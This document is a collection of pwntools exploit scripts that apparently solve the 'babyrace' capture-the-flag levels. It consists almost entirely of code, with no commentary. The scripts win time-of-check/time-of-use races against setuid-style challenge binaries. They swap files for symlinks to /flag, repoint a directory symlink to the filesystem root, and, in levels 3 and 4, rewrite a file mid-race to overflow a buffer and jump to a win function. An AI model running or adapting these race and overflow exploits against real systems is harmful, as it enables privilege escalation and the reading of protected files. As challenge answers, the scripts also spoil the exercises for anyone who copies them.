# lvl 1-0

```py
import os
import time
from pwn import *

context.log_level = 'critical'

binary = '/challenge/babyrace_level1.0'
target_file_name = 'f'
symlink_points_to = '/flag'
initial_content = 'dummy_data'

while True:
    if os.path.islink(target_file_name):
        os.unlink(target_file_name)
    elif os.path.exists(target_file_name):
        os.unlink(target_file_name)

    with open(target_file_name, 'w') as f_handle:
        f_handle.write(initial_content)

    p = None
    try:
        p = process([binary, os.path.abspath(target_file_name)])

        p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
        p.sendline()

        if os.path.exists(target_file_name) and not os.path.islink(target_file_name):
            os.unlink(target_file_name)
        else:
            if p and p.poll() is None: p.close()
            time.sleep(0.05)
            continue
        
        os.symlink(symlink_points_to, target_file_name)

        p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
        p.sendline()

      
        out = p.recv(timeout=0.5)
        print(out.decode(errors="ignore"))
        if b"pwn" in out:
            print(out)
            break
        
        p.close()
        p = None

    except Exception as e:
        pass
    finally:
        if p and p.poll() is None:
            p.close()
        if os.path.islink(target_file_name):
            os.unlink(target_file_name)
        elif os.path.exists(target_file_name):
            os.unlink(target_file_name)
    
    time.sleep(0.05)
```

# lvl 1-1

```py
import os
import time
from pwn import *

context.log_level = 'critical'

binary = '/challenge/babyrace_level1.1'
target_file_name = 'f'
symlink_points_to = '/flag'
initial_content = 'dummy_data'

while True:
    if os.path.islink(target_file_name):
        os.unlink(target_file_name)
    elif os.path.exists(target_file_name):
        os.unlink(target_file_name)

    with open(target_file_name, 'w') as f_handle:
        f_handle.write(initial_content)

    p = None
    try:
        p = process([binary, os.path.abspath(target_file_name)])
        out = p.recv(timeout=0.5)
        print(out.decode(errors="ignore"))

        if os.path.exists(target_file_name) and not os.path.islink(target_file_name):
            os.unlink(target_file_name)
        else:
            if p and p.poll() is None: p.close()
            time.sleep(0.05)
            continue
        
        os.symlink(symlink_points_to, target_file_name)


        out = p.recv(timeout=0.5)
        print(out.decode(errors="ignore"))
        if b"pwn" in out:
            print(out)
            break
        
        p.close()
        p = None

    except Exception as e:
        pass
    finally:
        if p and p.poll() is None:
            p.close()
        if os.path.islink(target_file_name):
            os.unlink(target_file_name)
        elif os.path.exists(target_file_name):
            os.unlink(target_file_name)
    
    #time.sleep(0.05)
```


# lvl 2-1 

```py
import os
import time
from pwn import *

context.log_level = 'critical'

binary = '/challenge/babyrace_level2.1'
target_file_name = 'f'
symlink_points_to = '/flag'
initial_content = 'dummy_data'
absolute_target_path = os.path.abspath(target_file_name)

while True:
    if os.path.islink(absolute_target_path):
        os.unlink(absolute_target_path)
    elif os.path.exists(absolute_target_path):
        os.unlink(absolute_target_path)

    with open(absolute_target_path, 'w') as f_handle:
        f_handle.write(initial_content)

    p = None
    try:
        p = process([binary, absolute_target_path])
        
        if os.path.exists(absolute_target_path) and not os.path.islink(absolute_target_path):
            os.unlink(absolute_target_path)
        else:
            if os.path.islink(absolute_target_path):
                 os.unlink(absolute_target_path)
            if p and p.poll() is None: p.close()
            time.sleep(0.01) 
            continue
            
        # dvabrunot symlink     
        os.symlink(symlink_points_to, absolute_target_path)

        output_bytes = p.recvall(timeout=0.05) 
   
        
        # Ensure process is terminated
        if p and p.poll() is None:
            p.terminate()
            try:
                p.wait(timeout=0.05)
            except PwnlibException: 
                pass 
        if p and p.poll() is None:
            p.kill()
            try:
                p.wait(timeout=0.05)
            except PwnlibException:
                pass


        output_str = output_bytes.decode(errors="ignore").strip()
        
        expected_fail_output_content = initial_content + "### Goodbye!"
        
        if output_str and output_str != expected_fail_output_content and "failed to get file status" not in output_str:
            print("\n--- POTENTIAL FLAG FOUND ---")
            print(output_bytes.decode(errors="ignore")) 
            print("--- END POTENTIAL FLAG ---\n")
            if "pwn" in output_str.lower() :
                break
        
        
        p = None

    except Exception as e:
        if p and p.poll() is None:
            try:
                p.kill()
                p.wait(timeout=0.01)
            except:
                pass
        p = None
    finally:
        if p and p.poll() is None: 
            try:
                p.kill()
            except:
                pass
        if os.path.islink(absolute_target_path):
            os.unlink(absolute_target_path)
        elif os.path.exists(absolute_target_path): 
            os.unlink(absolute_target_path)
    
```



# lvl 3-0 

```py
import os
import time
from pwn import *

context.log_level = 'critical'

binary = '/challenge/babyrace_level3.0'
target_file_name = '/home/hacker/pwn/my.txt'

overflow_content = b'A' * 256 + b'\x01\x01\x01\x01\x01\x01\x01\x01'
initial_content = b'dummy_data' 

absolute_target_path = os.path.abspath(target_file_name)

while True:
    if os.path.islink(absolute_target_path):
        os.unlink(absolute_target_path)
    elif os.path.exists(absolute_target_path):
        os.unlink(absolute_target_path)

    with open(absolute_target_path, 'wb') as f_handle:
        f_handle.write(initial_content)

    p = None
    try:
        p = process([binary, absolute_target_path])

        p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
        p.sendline() 

        with open(absolute_target_path, 'wb') as f_handle:
            f_handle.write(overflow_content)

        p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
        p.sendline()

        output_bytes = p.recvall(timeout=0.5) 

        if p and p.poll() is None:
            p.terminate()
            try:
                p.wait(timeout=0.05)
            except PwnlibException:
                pass
        if p and p.poll() is None:
            p.kill()
            try:
                p.wait(timeout=0.05)
            except PwnlibException:
                pass

        output_str = output_bytes.decode(errors="ignore").strip()

       
        if "win" in output_str.lower() or "flag" in output_str.lower():
            print("\n--- WIN CONDITION MET ---")
            print(output_bytes.decode(errors="ignore"))
            print("--- END WIN CONDITION ---\n")
            break 

        p = None

    except Exception as e:
        if p and p.poll() is None:
            try:
                p.kill()
                p.wait(timeout=0.01)
            except:
                pass
        p = None
    finally:
        if p and p.poll() is None:
            try:
                p.kill()
            except:
                pass
        if os.path.islink(absolute_target_path):
            os.unlink(absolute_target_path)
        elif os.path.exists(absolute_target_path):
            os.unlink(absolute_target_path)
    # time.sleep(0.001) 
```


# lvl 4-0

```py
import os
import time
from pwn import *

context.log_level = 'critical'
context.arch = 'amd64'

binary = '/challenge/babyrace_level4.0'
target_file_name = '/home/hacker/pwn/my.txt'

win_last_two_bytes = 0x4012f6


padding_size = 0x190
overflow_content = b'A' * padding_size + 8*b'b' + p64(win_last_two_bytes)

initial_content = b'dummy_data'

absolute_target_path = os.path.abspath(target_file_name)

while True:
    if os.path.islink(absolute_target_path):
        os.unlink(absolute_target_path)
    elif os.path.exists(absolute_target_path):
        os.unlink(absolute_target_path)

    with open(absolute_target_path, 'wb') as f_handle:
        f_handle.write(initial_content)

    p = None

    p = process([binary, absolute_target_path])

    p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
    p.sendline()


    with open(absolute_target_path, 'wb') as f_handle:
        f_handle.write(overflow_content)
    
    p.recvuntil(b"Paused (press enter to continue)\n", timeout=5)
    p.sendline()


    output_bytes = p.recvall(timeout=0.5) 

    output_str = output_bytes.decode(errors="ignore").strip()

    print(output_str)
    if "pwn" in output_str.lower() :
        print("\n--- WIN CONDITION MET ---")
        print(output_bytes.decode(errors="ignore"))
        print("--- END WIN CONDITION ---\n")
        break 

    p = None


```



# lvl 5-0

```py
import os
import time
import shutil
from pwn import *


context.log_level = 'info'
binary_path = '/challenge/babyrace_level5.0'
dummy_content = b'InitialDummyContentForLstat\n'


pwn_base_dir = "/home/hacker/pwn"
a_path = os.path.join(pwn_base_dir, "a") 
b_path = os.path.join(a_path, "b")    


try:
    if not os.path.exists(pwn_base_dir):
        os.makedirs(pwn_base_dir, exist_ok=True)
    if not os.access(pwn_base_dir, os.W_OK):
        exit(1)
except OSError as e:
    exit(1)


success = False

while True:

    try: 
        if os.path.islink(b_path) or os.path.exists(b_path):
            os.unlink(b_path)
    except OSError:
        pass

    try: 
        if os.path.islink(a_path):
            os.unlink(a_path)
        elif os.path.isdir(a_path):
            shutil.rmtree(a_path) 
    except OSError:
        pass

  
    try:
        os.makedirs(a_path, exist_ok=True) 
        with open(b_path, 'wb') as b_file:
            b_file.write(dummy_content)   
    except OSError as e:
        time.sleep(0.05) 
        continue

    p = process([binary_path, b_path])

  

    if not p.recvuntil(b"Paused (press enter to continue)\n", timeout=3):
        if p: p.close()
        time.sleep(0.05)
        continue
   
    print(p.recv(timeout=0.1).decode(errors="ignore"), end='')
    p.sendline()

  
    try:
        shutil.rmtree(a_path)       
        os.symlink("/", a_path)     
    except OSError as e:
        log.debug(f"Race Action 1 (symlink a_path to /) failed: {e}. Retrying...")
        if p: p.close()
        time.sleep(0.05)
        continue

    
    if not p.recvuntil(b"Paused (press enter to continue)\n", timeout=3):
        log.debug("Timeout or no 'Paused' message before second continue.")
        if p: p.close()
        time.sleep(0.05)
        continue
    
    print(p.recv(timeout=0.1).decode(errors="ignore"), end='')
    p.sendline()

   


    if not p.recvuntil(b"Paused (press enter to continue)\n", timeout=3):
        log.debug("Timeout or no 'Paused' message before third continue.")
        if p: p.close()
        time.sleep(0.05)
        continue

    try:
        os.unlink(a_path)                
        os.mkdir(a_path)                 
        os.symlink("/flag", b_path)      
    except OSError as e:
        log.debug(f"Race Action 2 (symlink b_path to /flag) failed: {e}. Retrying...")
        if p: p.close()
        time.sleep(0.05)
        continue

    print(p.recv(timeout=0.1).decode(errors="ignore"), end='')
    p.sendline() 


    out = p.recv(timeout=0.5)
    print(out.decode(errors="ignore"))
    if b"pwn" in out:
        print(out)
        break
    
    p.close()
    p = None
```

# lvl 5-1

```py
import os
import shutil
import threading
import time
from pwn import *

context.log_level = 'info'
binary_path = '/challenge/babyrace_level5.1'
dummy_content = b'InitialDummyContentForLstat\n'

pwn_base_dir = "/home/hacker/pwn"
a_path = os.path.join(pwn_base_dir, "a") 
b_path = os.path.join(a_path, "b")     

def prepare_clean_fs():
    try:
        if not os.path.exists(pwn_base_dir):
            os.makedirs(pwn_base_dir, exist_ok=True)
        if not os.access(pwn_base_dir, os.W_OK):
            exit(1)
    except OSError as e:
        exit(1)
    try: 
        if os.path.islink(b_path) or os.path.exists(b_path):
            os.unlink(b_path)
    except OSError:
        pass

    try: 
        if os.path.islink(a_path):
            os.unlink(a_path)
        elif os.path.isdir(a_path):
            shutil.rmtree(a_path) 
    except OSError:
        pass

  
    try:
        os.makedirs(a_path, exist_ok=True) 
        with open(b_path, 'wb') as b_file:
            b_file.write(dummy_content)   
    except OSError as e:
        time.sleep(0.05) 
        

def symlink_race_thread():
    while True:
        try:
            shutil.rmtree(a_path)
            os.symlink("/", a_path)
        except: pass

def file_symlink_race_thread():
    while True:
        try:
            if os.path.exists(b_path) or os.path.islink(b_path):
                os.unlink(b_path)
            os.symlink("/flag", b_path)
        except: pass


threading.Thread(target=symlink_race_thread, daemon=True).start()
threading.Thread(target=file_symlink_race_thread, daemon=True).start()


while True:
    prepare_clean_fs()
    p = process([binary_path, b_path])
    try:
        out = p.recvall(timeout=1)
        print(out.decode(errors="ignore"))
        if b"pwn" in out:
            print("[+] Success!")
            break
    except:
        pass
    p.close()
```

